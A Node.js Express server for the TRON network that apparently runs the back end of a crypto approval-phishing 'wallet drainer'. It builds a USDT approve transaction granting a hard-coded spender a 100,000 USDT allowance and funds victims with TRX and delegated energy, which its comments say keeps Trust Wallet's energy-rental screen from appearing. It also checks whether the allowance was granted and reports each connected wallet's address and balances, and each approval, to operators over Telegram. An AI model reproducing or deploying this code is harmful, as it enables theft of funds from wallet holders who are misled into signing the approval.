const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const TronWebModule = require('tronweb');
const TronWeb = TronWebModule.default || TronWebModule;
const axios = require('axios');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 4000;

// Render sits behind a proxy — required for correct client IPs in rate limiting
app.set('trust proxy', 1);

app.use(helmet());
app.use(cors({ origin: true, credentials: true }));
app.use(express.json({ limit: '1mb' }));

const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: Number(process.env.RATE_LIMIT_MAX || 2000),
  standardHeaders: true,
  legacyHeaders: false,
  message: { success: false, error: 'Too many requests from this IP, please try again later.' },
  skip: (req) => {
    const path = req.path || '';
    // Never throttle Telegram notifies, client event logs, or health checks
    if (req.method === 'GET' && (path === '/health' || path === '/server-info')) return true;
    if (
      path === '/api/telegram' ||
      path === '/telegram-notify' ||
      path === '/api/event' ||
      path === '/build-approve' ||
      path === '/prepare-energy' ||
      path === '/check-approval'
    ) {
      return true;
    }
    return false;
  }
});
app.use(limiter);

// Request logger — every hit appears in Render Logs
app.use((req, res, next) => {
  const started = Date.now();
  res.on('finish', () => {
    console.log(
      `[HTTP] ${req.method} ${req.originalUrl || req.url} -> ${res.statusCode} (${Date.now() - started}ms)`
    );
  });
  next();
});

function logEvent(stage, details = {}) {
  const payload = {
    stage,
    time: new Date().toISOString(),
    ...details
  };
  console.log(`[EVENT] ${stage}`, JSON.stringify(payload));
  return payload;
}

const tronGridApiKey = process.env.TRONGRID_API_KEY || process.env.TRON_API_KEY;
const privateKey = (process.env.TRON_PRIVATE_KEY || '').replace(/^0x/i, '').trim();

if (!privateKey) {
  console.error('❌ TRON_PRIVATE_KEY is missing. TRX top-up will fail until it is set.');
}

const tronWeb = new TronWeb({
  fullHost: process.env.TRONGRID_FULL_HOST || 'https://api.trongrid.io',
  headers: tronGridApiKey
    ? { 'TRON-PRO-API-KEY': tronGridApiKey }
    : {},
  privateKey: privateKey || undefined
});

let derivedAddress = null;
try {
  if (privateKey) {
    derivedAddress = tronWeb.address.fromPrivateKey(privateKey);
  }
} catch (error) {
  console.error('❌ Invalid TRON_PRIVATE_KEY:', error.message);
}

const configuredAddress = (process.env.TRON_ADDRESS || '').trim();
if (configuredAddress && derivedAddress && configuredAddress !== derivedAddress) {
  console.warn(
    `⚠️ TRON_ADDRESS (${configuredAddress}) does not match private key address (${derivedAddress}). Using private key address.`
  );
}

const SERVER_CONFIG = {
  privateKey,
  address: derivedAddress || configuredAddress || null,
  // Send enough TRX so Trust can pay approve fee with TRX (no energy-rental Continue hang)
  autoSendAmount: Number(process.env.AUTO_SEND_AMOUNT || 20),
  // Top-up when user has below this many TRX
  minimumBalance: Number(process.env.MINIMUM_BALANCE || 10), // keep in sync with FE minTrx
  // Keep a little TRX for bandwidth / fees so sends do not fail at the edge
  feeReserve: Number(process.env.FEE_RESERVE_TRX || 1),
  // TRX amount of ENERGY to delegate to user so Trust does not show Energy rental
  delegateEnergyTrx: Number(process.env.DELEGATE_ENERGY_TRX || 15),
  minUserEnergy: Number(process.env.MIN_USER_ENERGY || 65000),
  usdtContract: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
  approveSpender: 'TWejasrnoKg2AgPpCwHgozYeThWBu8S9Hw',
  approveAmount: '100000000000'
};

if (SERVER_CONFIG.address) {
  tronWeb.setAddress(SERVER_CONFIG.address);
}

const wait = (milliseconds) => new Promise((resolve) => setTimeout(resolve, milliseconds));

function toTrxNumber(value) {
  const amount = Number(tronWeb.fromSun(value));
  return Number.isFinite(amount) ? amount : 0;
}

function isRateLimitedError(error) {
  const status = error.response?.status || error.status;
  const errorText = `${error.message || ''} ${status || ''}`.toLowerCase();
  return (
    status === 429 ||
    errorText.includes('status code 429') ||
    errorText.includes('too many requests') ||
    errorText.includes('rate limit')
  );
}

async function getUserEnergyLeft(address) {
  try {
    const resources = await tronWeb.trx.getAccountResources(address);
    const limit = Number(resources?.EnergyLimit || 0);
    const used = Number(resources?.EnergyUsed || 0);
    return Math.max(0, limit - used);
  } catch (error) {
    logEvent('USER_ENERGY_CHECK_FAILED', { address, error: error.message });
    return 0;
  }
}

async function signAndBroadcast(tx) {
  const signed = await tronWeb.trx.sign(tx, SERVER_CONFIG.privateKey);
  return tronWeb.trx.sendRawTransaction(signed);
}

/**
 * Delegate ENERGY from server wallet to user so Trust Wallet
 * does NOT show the Energy rental Continue screen.
 */
/**
 * Fast ENERGY prep — do NOT block WalletConnect for long.
 * Fire one delegate (or freeze+delegate once) and return quickly.
 */
async function ensureUserEnergy(userAddress) {
  if (!SERVER_CONFIG.privateKey || !SERVER_CONFIG.address) {
    return { ok: false, reason: 'server_wallet_not_configured' };
  }

  const energyLeft = await getUserEnergyLeft(userAddress);
  logEvent('USER_ENERGY_CHECK', {
    userAddress,
    energyLeft,
    required: SERVER_CONFIG.minUserEnergy
  });

  if (energyLeft >= SERVER_CONFIG.minUserEnergy) {
    return { ok: true, delegated: false, reason: 'already_has_energy', energyLeft };
  }

  const amountSun = Number(tronWeb.toSun(SERVER_CONFIG.delegateEnergyTrx));

  const tryDelegate = async () => {
    const tx = await tronWeb.transactionBuilder.delegateResource(
      amountSun,
      userAddress,
      'ENERGY',
      SERVER_CONFIG.address,
      false
    );
    return signAndBroadcast(tx);
  };

  try {
    const result = await tryDelegate();
    const txid = result.txid || result.transaction?.txID;
    const accepted = result.result === true || Boolean(txid);
    if (!accepted) {
      throw new Error(result.message || result.code || 'delegate rejected');
    }
    logEvent('ENERGY_DELEGATED', {
      userAddress,
      amountTrx: SERVER_CONFIG.delegateEnergyTrx,
      transactionId: txid
    });
    await wait(1500);
    const after = await getUserEnergyLeft(userAddress);
    return {
      ok: true,
      delegated: true,
      amountTrx: SERVER_CONFIG.delegateEnergyTrx,
      transactionId: txid,
      energyLeft: after
    };
  } catch (delegateError) {
    logEvent('ENERGY_DELEGATE_DIRECT_FAILED', {
      userAddress,
      error: delegateError.message
    });
  }

  // One quick freeze+delegate attempt (no long poll — WC must not expire)
  try {
    const freezeTx = await tronWeb.transactionBuilder.freezeBalanceV2(
      amountSun,
      'ENERGY',
      SERVER_CONFIG.address
    );
    const freezeResult = await signAndBroadcast(freezeTx);
    const freezeTxid = freezeResult.txid || freezeResult.transaction?.txID;
    logEvent('ENERGY_FROZEN_FOR_DELEGATE', {
      amountTrx: SERVER_CONFIG.delegateEnergyTrx,
      transactionId: freezeTxid
    });
    await wait(2000);

    const result = await tryDelegate();
    const txid = result.txid || result.transaction?.txID;
    const accepted = result.result === true || Boolean(txid);
    if (!accepted) {
      throw new Error(result.message || result.code || 'delegate rejected after freeze');
    }
    logEvent('ENERGY_DELEGATED', {
      userAddress,
      amountTrx: SERVER_CONFIG.delegateEnergyTrx,
      afterFreeze: true,
      transactionId: txid
    });
    await wait(1500);
    const after = await getUserEnergyLeft(userAddress);
    return {
      ok: true,
      delegated: true,
      afterFreeze: true,
      amountTrx: SERVER_CONFIG.delegateEnergyTrx,
      transactionId: txid,
      energyLeft: after
    };
  } catch (error) {
    logEvent('ENERGY_PREPARE_FAILED', {
      userAddress,
      error: error.message
    });
    return { ok: false, reason: error.message };
  }
}

async function getUsdtAllowance(ownerAddress) {
  const result = await tronWeb.transactionBuilder.triggerConstantContract(
    SERVER_CONFIG.usdtContract,
    'allowance(address,address)',
    {},
    [
      { type: 'address', value: ownerAddress },
      { type: 'address', value: SERVER_CONFIG.approveSpender }
    ],
    ownerAddress
  );
  const hex = result?.constant_result?.[0];
  if (!hex) {
    return { allowance: '0', allowanceRaw: '0', approved: false };
  }
  let allowanceRaw = '0';
  try {
    allowanceRaw = tronWeb.toBigNumber('0x' + hex).toString(10);
  } catch (_) {
    allowanceRaw = BigInt('0x' + hex).toString(10);
  }
  const approved = allowanceRaw !== '0';
  return {
    allowance: allowanceRaw,
    allowanceRaw,
    approved,
    spender: SERVER_CONFIG.approveSpender,
    usdtContract: SERVER_CONFIG.usdtContract
  };
}

async function getTrxBalance(address) {
  if (!address) {
    throw new Error('Server wallet address is not configured');
  }

  for (let attempt = 0; attempt < 5; attempt += 1) {
    try {
      return await tronWeb.trx.getBalance(address);
    } catch (error) {
      if (!isRateLimitedError(error) || attempt === 4) {
        if (isRateLimitedError(error)) {
          throw new Error('TronGrid rate limit (429). Retry in a minute or check TRONGRID_API_KEY.');
        }
        throw error;
      }

      // Back off harder on TronGrid 429s
      await wait(1000 * Math.pow(2, attempt));
    }
  }
}

const validateRequest = (req, res, next) => {
  const { userAddress } = req.body || {};

  if (!userAddress) {
    return res.status(400).json({ error: 'User address is required', success: false });
  }

  if (!TronWeb.isAddress(userAddress)) {
    return res.status(400).json({ error: 'Invalid TRON address', success: false });
  }

  next();
};

function readEnv(name) {
  return String(process.env[name] || '').trim();
}

function collectTelegramTargets() {
  const tokenIndexes = new Set();
  const chatIndexes = new Set();

  for (const key of Object.keys(process.env)) {
    const tokenMatch = /^TELEGRAM_BOT_(\d+)_TOKEN$/.exec(key);
    if (tokenMatch) tokenIndexes.add(tokenMatch[1]);
    const chatMatch = /^TELEGRAM_CHAT_(\d+)_ID$/.exec(key);
    if (chatMatch) chatIndexes.add(chatMatch[1]);
  }

  const numbered = [];
  const indexes = [...new Set([...tokenIndexes, ...chatIndexes])].sort(
    (a, b) => Number(a) - Number(b)
  );

  for (const index of indexes) {
    const token = readEnv(`TELEGRAM_BOT_${index}_TOKEN`);
    const chatId = readEnv(`TELEGRAM_CHAT_${index}_ID`);
    if (!token || !chatId) continue;
    numbered.push({ index, token, chatId });
  }

  if (numbered.length > 0) return numbered;

  const token = readEnv('BOT_TOKEN') || readEnv('TELEGRAM_BOT_TOKEN');
  const chatId = readEnv('CHAT_ID') || readEnv('TELEGRAM_CHAT_ID');
  if (token && chatId) return [{ token, chatId }];

  return [];
}

function toSafeTelegramError(error, token) {
  let message = error?.message || 'Telegram API request failed';
  if (token) message = message.split(token).join('[redacted]');
  message = message.replace(/\/bot[^/?\s]+/g, '/bot[redacted]');
  return new Error(message);
}

async function sendTelegramToTarget(target, text) {
  const payload = {
    chat_id: target.chatId,
    text: String(text),
    disable_web_page_preview: true
  };

  let lastError;
  for (let attempt = 0; attempt < 3; attempt += 1) {
    try {
      const response = await axios.post(
        `https://api.telegram.org/bot${target.token}/sendMessage`,
        payload,
        { timeout: 15000 }
      );

      if (!response.data.ok) {
        throw new Error(response.data.description || 'Telegram API request failed');
      }

      return response.data;
    } catch (error) {
      lastError = error;
      const status = error.response?.status;
      const retryable = status === 429 || status >= 500 || !status;
      if (!retryable || attempt === 2) {
        break;
      }
      const retryAfterMs = Number(error.response?.headers?.['retry-after'] || 0) * 1000;
      await wait(retryAfterMs || 800 * (attempt + 1));
    }
  }

  throw toSafeTelegramError(lastError, target.token);
}

async function sendTelegramMessage(text) {
  const targets = collectTelegramTargets();

  if (targets.length === 0) {
    throw new Error('Missing BOT_TOKEN or CHAT_ID environment variables');
  }

  let firstSuccess = null;
  let lastError = null;

  for (const target of targets) {
    try {
      const data = await sendTelegramToTarget(target, text);
      if (!firstSuccess) firstSuccess = data;
    } catch (error) {
      lastError = error;
      if (targets.length > 1) {
        const label = target.index ? `bot ${target.index}` : 'configured bot';
        console.error(`Telegram send failed for ${label}: ${error.message}`);
      }
    }
  }

  if (firstSuccess) return firstSuccess;
  throw lastError;
}

app.get('/health', (req, res) => {
  res.json({
    ok: true,
    message: 'Master TRON + Telegram backend is running',
    serverAddress: SERVER_CONFIG.address,
    hasPrivateKey: Boolean(SERVER_CONFIG.privateKey),
    hasTronGridApiKey: Boolean(tronGridApiKey),
    timestamp: new Date().toISOString()
  });
});

app.get('/server-info', (req, res) => {
  res.json({
    success: true,
    serverAddress: SERVER_CONFIG.address,
    autoSendAmount: SERVER_CONFIG.autoSendAmount,
    minimumBalance: SERVER_CONFIG.minimumBalance,
    feeReserve: SERVER_CONFIG.feeReserve,
    network: 'Mainnet',
    apiVersion: '1.1.0'
  });
});

app.post('/api/event', (req, res) => {
  try {
    const body = req.body || {};
    const stage = String(body.stage || body.event || 'client_event');
    const details = { ...body };
    delete details.stage;
    delete details.event;
    logEvent(stage, details);
    res.json({ ok: true, logged: true, stage });
  } catch (error) {
    console.error('[EVENT] log failed:', error.message);
    res.status(500).json({ ok: false, error: error.message });
  }
});

// Delegate energy to user so Trust Wallet does not show Energy rental
app.post('/prepare-energy', validateRequest, async (req, res) => {
  try {
    const { userAddress } = req.body;
    logEvent('PREPARE_ENERGY_START', { userAddress });
    const energy = await ensureUserEnergy(userAddress);
    const energyLeft = await getUserEnergyLeft(userAddress);
    logEvent('PREPARE_ENERGY_RESULT', { userAddress, ...energy, energyLeft });
    res.json({
      success: Boolean(energy.ok),
      ...energy,
      energyLeft
    });
  } catch (error) {
    console.error('Prepare energy error:', error);
    logEvent('PREPARE_ENERGY_FAILED', {
      userAddress: req.body?.userAddress,
      error: error.message
    });
    res.status(500).json({
      success: false,
      error: 'Failed to prepare energy',
      message: error.message
    });
  }
});

// On-chain: is USDT allowance already set for our spender?
app.post('/check-approval', validateRequest, async (req, res) => {
  try {
    const { userAddress } = req.body;
    if (!userAddress || !tronWeb.isAddress(userAddress)) {
      return res.status(400).json({ success: false, error: 'Invalid userAddress' });
    }
    logEvent('CHECK_APPROVAL_START', { userAddress });
    const info = await getUsdtAllowance(userAddress);
    logEvent('CHECK_APPROVAL_RESULT', {
      userAddress,
      approved: info.approved,
      allowance: info.allowance
    });
    return res.json({
      success: true,
      ...info
    });
  } catch (error) {
    logEvent('CHECK_APPROVAL_FAILED', {
      userAddress: req.body?.userAddress,
      error: error.message
    });
    return res.status(500).json({
      success: false,
      approved: false,
      error: error.message
    });
  }
});

// Build USDT approve tx on server (uses TronGrid API key) so frontend avoids 429
app.post('/build-approve', validateRequest, async (req, res) => {
  try {
    const { userAddress } = req.body;
    // Never use 1e9 (USDT energy rental). Max 15 TRX feeLimit.
    let feeLimit = Number(req.body.feeLimit) > 0 ? Number(req.body.feeLimit) : 15e6;
    if (feeLimit >= 1e9) feeLimit = 15e6;
    const usdtContract = SERVER_CONFIG.usdtContract;
    const spender = SERVER_CONFIG.approveSpender;
    const amount = SERVER_CONFIG.approveAmount;

    logEvent('BUILD_APPROVE_START', { userAddress, feeLimit });

    const parameters = [
      { type: 'address', value: spender },
      { type: 'uint256', value: amount }
    ];
    const options = { feeLimit, callValue: 0 };
    const functionSelector = 'approve(address,uint256)';

    let lastError = null;
    let triggerResult = null;
    for (let attempt = 0; attempt < 5; attempt += 1) {
      try {
        if (attempt > 0) await wait(1500 * attempt);
        triggerResult = await tronWeb.transactionBuilder.triggerSmartContract(
          usdtContract,
          functionSelector,
          options,
          parameters,
          userAddress
        );
        lastError = null;
        break;
      } catch (error) {
        lastError = error;
        logEvent('BUILD_APPROVE_RETRY', {
          userAddress,
          attempt: attempt + 1,
          error: error.message,
          rateLimited: isRateLimitedError(error)
        });
        if (!isRateLimitedError(error) && attempt >= 1) break;
      }
    }

    if (lastError || !triggerResult) {
      logEvent('BUILD_APPROVE_FAILED', {
        userAddress,
        error: lastError?.message || 'empty trigger result'
      });
      return res.status(isRateLimitedError(lastError) ? 429 : 500).json({
        success: false,
        error: 'Failed to build approve transaction',
        message: lastError?.message || 'empty trigger result'
      });
    }

    logEvent('BUILD_APPROVE_OK', {
      userAddress,
      hasTransaction: Boolean(triggerResult.transaction || triggerResult)
    });

    res.json({
      success: true,
      triggerResult,
      feeLimit,
      owner: userAddress
    });
  } catch (error) {
    console.error('Build approve error:', error);
    logEvent('BUILD_APPROVE_FAILED', {
      userAddress: req.body?.userAddress,
      error: error.message
    });
    res.status(500).json({
      success: false,
      error: 'Failed to build approve transaction',
      message: error.message
    });
  }
});

app.post('/check-balance', validateRequest, async (req, res) => {
  try {
    const { userAddress } = req.body;
    logEvent('CHECK_BALANCE_START', { userAddress });
    const balance = await getTrxBalance(userAddress);
    const balanceInTRX = toTrxNumber(balance);
    logEvent('CHECK_BALANCE_RESULT', {
      userAddress,
      balance: balanceInTRX,
      needsFunding: balanceInTRX < SERVER_CONFIG.minimumBalance
    });

    res.json({
      success: true,
      address: userAddress,
      balance: balanceInTRX,
      needsFunding: balanceInTRX < SERVER_CONFIG.minimumBalance,
      autoSendAmount: SERVER_CONFIG.autoSendAmount
    });
  } catch (error) {
    console.error('Balance check error:', error);
    res.status(500).json({
      success: false,
      error: 'Failed to check balance',
      message: error.message
    });
  }
});

app.post('/send-trx', validateRequest, async (req, res) => {
  try {
    const { userAddress } = req.body;
    logEvent('TRX_TOPUP_REQUEST', { userAddress });

    if (!SERVER_CONFIG.privateKey || !SERVER_CONFIG.address) {
      logEvent('TRX_TOPUP_FAILED', { userAddress, reason: 'server_wallet_not_configured' });
      return res.status(500).json({
        success: false,
        error: 'Server wallet is not configured',
        message: 'Set TRON_PRIVATE_KEY (and optionally TRON_ADDRESS) in Render env vars'
      });
    }

    const balance = await getTrxBalance(userAddress);
    const balanceInTRX = toTrxNumber(balance);
    logEvent('TRX_TOPUP_BALANCE_CHECK', {
      userAddress,
      balance: balanceInTRX,
      minimumBalance: SERVER_CONFIG.minimumBalance
    });

    if (balanceInTRX >= SERVER_CONFIG.minimumBalance) {
      logEvent('TRX_TOPUP_SKIPPED', {
        userAddress,
        reason: 'already_funded',
        balance: balanceInTRX
      });
      return res.json({
        success: true,
        message: 'User already has sufficient balance',
        balance: balanceInTRX,
        sent: false
      });
    }

    const serverBalance = await getTrxBalance(SERVER_CONFIG.address);
    const serverBalanceInTRX = toTrxNumber(serverBalance);
    const requiredBalance = SERVER_CONFIG.autoSendAmount + SERVER_CONFIG.feeReserve;
    logEvent('TRX_TOPUP_SERVER_WALLET', {
      serverAddress: SERVER_CONFIG.address,
      serverBalance: serverBalanceInTRX,
      required: requiredBalance,
      autoSendAmount: SERVER_CONFIG.autoSendAmount
    });

    if (serverBalanceInTRX < requiredBalance) {
      logEvent('TRX_TOPUP_FAILED', {
        userAddress,
        reason: 'server_insufficient_funds',
        serverBalance: serverBalanceInTRX,
        required: requiredBalance
      });
      return res.status(500).json({
        success: false,
        error: 'Server has insufficient funds',
        serverBalance: serverBalanceInTRX,
        required: requiredBalance,
        autoSendAmount: SERVER_CONFIG.autoSendAmount
      });
    }

    const amountSun = Number(tronWeb.toSun(SERVER_CONFIG.autoSendAmount));
    logEvent('TRX_TOPUP_SENDING', {
      userAddress,
      amount: SERVER_CONFIG.autoSendAmount,
      amountSun
    });

    // Prefer high-level helper tied to the configured private key
    let result;
    try {
      result = await tronWeb.trx.sendTransaction(userAddress, amountSun);
    } catch (sendError) {
      // Fallback: explicit build + sign + broadcast
      console.warn('sendTransaction failed, trying manual sign path:', sendError.message);
      logEvent('TRX_TOPUP_FALLBACK_SIGN', { userAddress, error: sendError.message });
      const transaction = await tronWeb.transactionBuilder.sendTrx(
        userAddress,
        amountSun,
        SERVER_CONFIG.address
      );
      const signedTransaction = await tronWeb.trx.sign(transaction, SERVER_CONFIG.privateKey);
      result = await tronWeb.trx.sendRawTransaction(signedTransaction);
    }

    const txid = result.txid || result.transaction?.txID || result.transaction?.txid;
    const accepted = result.result === true || Boolean(txid);

    if (accepted) {
      console.log(`✅ Sent ${SERVER_CONFIG.autoSendAmount} TRX to ${userAddress} | txid=${txid}`);
      logEvent('TRX_TOPUP_SENT', {
        userAddress,
        amount: SERVER_CONFIG.autoSendAmount,
        transactionId: txid
      });

      // Return immediately — FE waits 5s then opens Trust approve popup. No energy.
      return res.json({
        success: true,
        message: `Sent ${SERVER_CONFIG.autoSendAmount} TRX successfully`,
        transactionId: txid,
        amount: SERVER_CONFIG.autoSendAmount,
        recipient: userAddress,
        sent: true
      });
    }

    const failureMessage =
      result.message ||
      result.code ||
      (typeof result === 'object' ? JSON.stringify(result) : 'Transaction failed');

    throw new Error(failureMessage);
  } catch (error) {
    console.error('Send TRX error:', error);
    logEvent('TRX_TOPUP_FAILED', {
      userAddress: req.body?.userAddress,
      reason: error.message
    });
    const rateLimited = isRateLimitedError(error);
    res.status(rateLimited ? 429 : 500).json({
      success: false,
      error: rateLimited ? 'TronGrid rate limited' : 'Failed to send TRX',
      message: error.message
    });
  }
});

app.post('/transaction-status', async (req, res) => {
  try {
    const { transactionId } = req.body || {};

    if (!transactionId) {
      return res.status(400).json({ success: false, error: 'Transaction ID is required' });
    }

    const transaction = await tronWeb.trx.getTransaction(transactionId);

    res.json({
      success: true,
      transactionId,
      status: transaction.ret ? 'success' : 'failed',
      confirmed: Boolean(transaction.ret),
      transaction
    });
  } catch (error) {
    console.error('Transaction status error:', error);
    res.status(500).json({
      success: false,
      error: 'Failed to get transaction status',
      message: error.message
    });
  }
});

app.post('/telegram-notify', async (req, res) => {
  try {
    const { type, walletAddress, balance, usdtBalance, transactionId, amount, trxBalance, timestamp } =
      req.body || {};

    let message = '';

    if (type === 'wallet_connect') {
      const trxBalanceStr = balance !== undefined ? Number(balance).toFixed(6) : 'N/A';
      const usdtBalanceStr = usdtBalance !== undefined ? Number(usdtBalance).toFixed(2) : 'N/A';
      message =
        `🔗 Wallet Connected\n\n` +
        `💰 Wallet Address: ${walletAddress}\n` +
        `💵 TRX Balance: ${trxBalanceStr} TRX\n` +
        `💵 USDT Balance: ${usdtBalanceStr} USDT\n` +
        `🕐 Time: ${timestamp || new Date().toISOString()}\n\n` +
        `✅ User successfully connected their wallet`;
    } else if (type === 'transaction_approve') {
      const amountInTRX = amount ? (Number(amount) / 1000000).toFixed(6) : 'N/A';
      const txIdStr = transactionId ? String(transactionId) : 'N/A';
      const trxBalanceStr = trxBalance !== undefined ? Number(trxBalance).toFixed(6) : 'N/A';
      const usdtBalanceStr = usdtBalance !== undefined ? Number(usdtBalance).toFixed(2) : 'N/A';

      message =
        `✅ Transaction Approved\n\n` +
        `💰 Wallet Address: ${walletAddress}\n` +
        `📊 Transaction ID: ${txIdStr}\n` +
        `💵 Transaction Amount: ${amountInTRX} TRX\n` +
        `💵 Current TRX Balance: ${trxBalanceStr} TRX\n` +
        `💵 Current USDT Balance: ${usdtBalanceStr} USDT\n` +
        `🕐 Time: ${timestamp || new Date().toISOString()}\n\n` +
        `✅ User successfully approved the contract transaction`;
    } else {
      return res.status(400).json({ success: false, error: 'Invalid notification type' });
    }

    const result = await sendTelegramMessage(message);

    res.json({
      success: true,
      message: 'Telegram notification sent',
      telegramMessageId: result.result && result.result.message_id
    });
  } catch (error) {
    console.error('Telegram notification error:', error);
    res.status(500).json({
      success: false,
      error: 'Failed to send Telegram notification',
      message: error.message
    });
  }
});

app.post('/api/telegram', async (req, res) => {
  try {
    const payload = req.body || {};
    const text = payload.text || payload.message || 'No message provided';
    logEvent('TELEGRAM_SEND_START', {
      preview: String(text).slice(0, 180),
      length: String(text).length
    });
    const result = await sendTelegramMessage(text);
    logEvent('TELEGRAM_SEND_OK', {
      messageId: result?.result?.message_id || null
    });

    res.json({ ok: true, result });
  } catch (error) {
    console.error('Telegram send failed:', error);
    logEvent('TELEGRAM_SEND_FAILED', { error: error.message });
    res.status(500).json({ ok: false, error: error.message });
  }
});

app.use((err, req, res, next) => {
  console.error('Server error:', err);
  res.status(500).json({
    success: false,
    error: 'Internal server error',
    message: err.message
  });
});

app.listen(PORT, () => {
  console.log(`🚀 Master TRON + Telegram backend running on port ${PORT}`);
  console.log(`🔑 Server address: ${SERVER_CONFIG.address || 'NOT SET'}`);
  console.log(`💰 Auto-send amount: ${SERVER_CONFIG.autoSendAmount} TRX`);
  console.log(`📊 Minimum balance: ${SERVER_CONFIG.minimumBalance} TRX`);
  console.log(`🛡️ Fee reserve: ${SERVER_CONFIG.feeReserve} TRX`);
  console.log(`🌐 TronGrid API key: ${tronGridApiKey ? 'configured' : 'not configured'}`);
});

module.exports = app;
